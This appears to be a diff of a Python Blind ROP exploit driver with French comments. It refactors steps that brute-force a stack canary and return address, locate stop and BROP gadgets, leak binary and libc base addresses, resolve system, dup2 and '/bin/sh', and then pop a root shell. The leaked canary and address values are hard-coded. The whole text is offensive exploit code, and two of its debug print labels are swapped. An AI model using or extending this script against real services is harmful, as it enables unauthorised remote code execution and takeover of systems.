@@ -8,7 +8,6 @@ from binadr import *
 from libcadr import *
 from shell import *
 
-DODO = 0.03     # Cette valeur permet d'adapter les slesp si probleme de reception de paquet (a la campagne il doit etre grand x) )
 
 #----------
 class BinAdr():
@@ -49,9 +48,9 @@ class LeakedValues():
         super().__init__()
 
         ##### A ADAPTER
-        self.CANARY = p64(0x633ff5b6fce38600)
-        self.RBP        = p64(0x00007ffc44c70320)
-        self.RETADR = p64(0x00007f8332301245)
+        self.CANARY = p64(0x2d9958f51ef7d400)
+        self.RBP        = p64(0x7ffc01a4ea30)
+        self.RETADR = p64(0x7f7104bf223e)
         ###############
 
 
@@ -68,6 +67,7 @@ class ExploitStructure(BinAdr, LibcAdr, LeakedValues):
         self.EXPLOIT    = 1
         self.SIMPLELEAK = False
         self.HAND       = False
+        self.DODO       = 0.03     # Cette valeur permet d'adapter les slesp si probleme de reception de paquet (a la campagne il doit etre grand x) )
 
 
     def remoteConnect(self):
@@ -92,29 +92,29 @@ def persoPrint(STRING, ADR, NE):
 #####
 
 def stopGadget(ExploitStructure):
-    TMP = ExploitStructure
-    TMP.STOPGADGET  = binadr.getStopGadget(TMP)
-    persoPrint('STOPGADGET ', TMP.STOPGADGET, 1)
-    binadr.testGadget(TMP, 'STOPGADGET')
+    ExploitStructure.STOPGADGET  = getStopGadget(ExploitStructure)
+    persoPrint('STOPGADGET ', ExploitStructure.STOPGADGET, 1)
+    testGadget(ExploitStructure, 'STOPGADGET')
+    return ExploitStructure
 
 def bropGadget(ExploitStructure):
-    TMP = ExploitStructure
-    TMP.BROPGADGET  = binadr.getBropGadget(TMP)
-    persoPrint('BROPGADGET ', TMP.BROPGADGET, 1)
-    binadr.testGadget(TMP, 'BROPGADGET')
+    ExploitStructure.BROPGADGET  = getBropGadget(ExploitStructure)
+    persoPrint('BROPGADGET ', ExploitStructure.BROPGADGET, 1)
+    testGadget(ExploitStructure, 'BROPGADGET')
+    return ExploitStructure
 
 def leakAdr(ExploitStructure):
-    TMP = ExploitStructure
-    TMP.LEAKADR, TMP.BINBASE = binadr.getLeakFunction(TMP)
-    persoPrint('BINBASE    ', TMP.BINBASE, 0)
-    persoPrint('LEAKADR    ', TMP.LEAKADR, 1)
-    binadr.testGadget(TMP, 'LEAKADR')
+    ExploitStructure.LEAKADR, ExploitStructure.BINBASE = getLeakFunction(ExploitStructure)
+    persoPrint('BINBASE    ', ExploitStructure.BINBASE, 0)
+    persoPrint('LEAKADR    ', ExploitStructure.LEAKADR, 1)
+    testGadget(ExploitStructure, 'LEAKADR')
+    return ExploitStructure
 
 def libcBase(ExploitStructure):
-    TMP = ExploitStructure
-    TMP.LIBCBASE = libcadr.getLibcBase(TMP)
-    persoPrint('LIBCBASE   ', TMP.LIBCBASE, 1)
-    binadr.testGadget(TMP, 'LEAKADR')
+    ExploitStructure.LIBCBASE = getLibcBase(ExploitStructure)
+    persoPrint('LIBCBASE   ', ExploitStructure.LIBCBASE, 1)
+    testGadget(ExploitStructure, 'LEAKADR')
+    return ExploitStructure
 
 
 def checkBuildID(BUILDID):
@@ -130,7 +130,7 @@ def checkBuildID(BUILDID):
     else:
         print(CRED + "[!] Error with given BuildID    : " + BUILDID + CEND)
         '''
-        vori si je demande quoi faire genre en remettre un, par exemple :
+        voir si je demande quoi faire genre en remettre un, par exemple :
             ANOTHER = input(CJAU + "[?] Use specific BuildID ? (y / n) " + CEND)
             if ANOTHER == 'n':
                 return 0
@@ -143,20 +143,18 @@ def checkBuildID(BUILDID):
 
 
 def leakLib(ExploitStructure):
-    TMP = ExploitStructure
-    if (TMP.NOLIBLEAK):
+    if (ExploitStructure.NOLIBLEAK):
         return
-    libcadr.leakStuff(TMP)
+    leakStuff(ExploitStructure)
 
 def symboles(ExploitStructure):
-    TMP = ExploitStructure
-    TMP.SYSTEM, TMP.DUP2, TMP.BINSH = libcadr.getSymboles(TMP)
-    persoPrint('DUP2       ', TMP.SYSTEM, 0)
-    persoPrint('SYSTEM     ', TMP.DUP2, 0)
-    persoPrint('BINSH      ', TMP.BINSH, 0)
+    ExploitStructure.SYSTEM, ExploitStructure.DUP2, ExploitStructure.BINSH = getSymboles(ExploitStructure)
+    persoPrint('DUP2       ', ExploitStructure.SYSTEM, 0)
+    persoPrint('SYSTEM     ', ExploitStructure.DUP2, 0)
+    persoPrint('BINSH      ', ExploitStructure.BINSH, 0)
 
 def popShellGotRoot(ExploitStructure):
-    shell.exploit(ExploitStructure)
+    exploit(ExploitStructure)
 
 
 #####
@@ -166,11 +164,9 @@ def main():
     es = ExploitStructure()
     checkParameter(es)
 
-
-#-----
     if es.EXPLOIT == 1:
         printInfo("Starting simple leak")
-        es  = binadr.leakValues(es)
+        es  = leakValues(es)
         printDone("All 'Leakable' values have been leaked")
 
     elif es.EXPLOIT == 2:
@@ -184,11 +180,11 @@ def main():
         else:
             es = leakValues(es)
 
-        stopGadget(es)
-        bropGadget(es)
-        leakAdr(es)
+        es = stopGadget(es)
+        es = bropGadget(es)
+        es = leakAdr(es)
 
-        libcBase(es)
+        es = libcBase(es)
 
         leakLib(es)
         symboles(es)
